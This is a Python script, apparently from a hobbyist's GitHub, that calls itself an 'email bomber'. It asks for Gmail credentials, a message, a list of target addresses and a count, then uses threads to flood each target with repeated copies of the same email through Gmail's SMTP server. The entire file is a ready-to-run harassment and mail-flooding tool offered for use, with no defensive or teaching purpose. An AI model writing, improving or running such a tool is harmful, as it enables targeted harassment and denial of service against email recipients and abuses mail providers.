import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import threading
import os 

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
RESET = '\033[0m'

os.system('cls' if os.name == 'nt' else 'clear')

print("\n-------------------------------------------------------------------------------------------------------------------------------")
print("■■             ■■  ■■■■■■■  ■■         ■■■■■■    ■■■■■        ■■■   ■■■      ■■■■■■■")
print(" ■■           ■■   ■■       ■■        ■■       ■■     ■■     ■■ ■■ ■■ ■■     ■■     ")
print("  ■■   ■■■   ■■    ■■■■■■■  ■■       ■■        ■■     ■■    ■■   ■■■   ■■    ■■■■■■■")
print("   ■■ ■■ ■■ ■■     ■■       ■■        ■■       ■■     ■■   ■■           ■■   ■■     ")
print("    ■■■   ■■■      ■■■■■■■  ■■■■■■■    ■■■■■■    ■■■■■    ■■             ■■  ■■■■■■■")
print("")
print("■■■■■■■■    ■■■■■")
print("   ■■     ■■     ■■")
print("   ■■     ■■     ■■")
print("   ■■     ■■     ■■")
print("   ■■       ■■■■■")
print("")
print("■■■■■■     ■■■■■■■  ■■■■■■■  ■■■■■■  ")
print("■■   ■■    ■■       ■■       ■■   ■■")
print("■■    ■■   ■■■■■■■  ■■■■■■■  ■■■■■■  ")
print("■■   ■■    ■■       ■■       ■■      ")
print("■■■■■■     ■■■■■■■  ■■■■■■■  ■■      ")
print("                                   ■■■■■   ■■■■■■■      ■■■■      ■■■■■■      ■■■■■■  ■■    ■■  ■■■■■■■  ■■■■■■")
print("                                  ■■       ■■          ■■  ■■     ■■   ■■    ■■       ■■    ■■  ■■       ■■   ■■")
print("                                   ■■■■■   ■■■■■■■    ■■■■■■■■    ■■■■■■    ■■        ■■■■■■■■  ■■■■■■■  ■■■■■■")
print("                                       ■■  ■■        ■■      ■■   ■■   ■■    ■■       ■■    ■■  ■■       ■■   ■■")
print("                                   ■■■■■   ■■■■■■■  ■■        ■■  ■■    ■■    ■■■■■■  ■■    ■■  ■■■■■■■  ■■    ■■")
print("")
print(BLUE + "■■■■■■■      ■■■   ■■■          ■■■■      ■■  ■■")
print("■■          ■■ ■■ ■■ ■■        ■■  ■■         ■■")
print("■■■■■■■    ■■   ■■■   ■■      ■■■■■■■■    ■■  ■■")
print("■■        ■■           ■■    ■■      ■■   ■■  ■■")
print("■■■■■■■  ■■             ■■  ■■        ■■  ■■  ■■■■■■■" + RESET)
print("\n-------------------------------------------------------------------------------------------------------------------------------")
print(GREEN + "Maker : Sigma")
print("Github : https://github.com/ermwhatesigma" + RESET)
print("\nThis is the email bomber\n")


def get_user_input(prompt):
    return input(prompt)

EMAIL_ADDRESS = get_user_input("Enter your email address: ")
EMAIL_PASSWORD = get_user_input("Enter your app-specific password: ")
SUBJECT = get_user_input("Enter the subject of the email: ")
MESSAGE = get_user_input("Enter the message to send: ")

def send_email(target_email, num_emails):
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = target_email
        msg['Subject'] = SUBJECT
        msg.attach(MIMEText(MESSAGE, 'plain'))
        for _ in range(num_emails):
            server.sendmail(EMAIL_ADDRESS, target_email, msg.as_string())
            print(f"Email sent to {target_email}")
    except smtplib.SMTPAuthenticationError:
        print(f"Failed to send email to {target_email}: Authentication failed. Please check your email address and password.")
    except smtplib.SMTPException as e:
        print(f"Failed to send email to {target_email}: {e}")
    finally:
        server.quit()

def email_bomber(target_emails, num_emails):
    threads = []
    for target_email in target_emails:
        thread = threading.Thread(target=send_email, args=(target_email, num_emails))
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()

if __name__ == '__main__':
    target_emails_input = get_user_input("Enter the target emails separated by commas: ")
    target_emails = [email.strip() for email in target_emails_input.split(',')]
    num_emails = int(get_user_input("Enter the number of emails to send: "))
    email_bomber(target_emails, num_emails)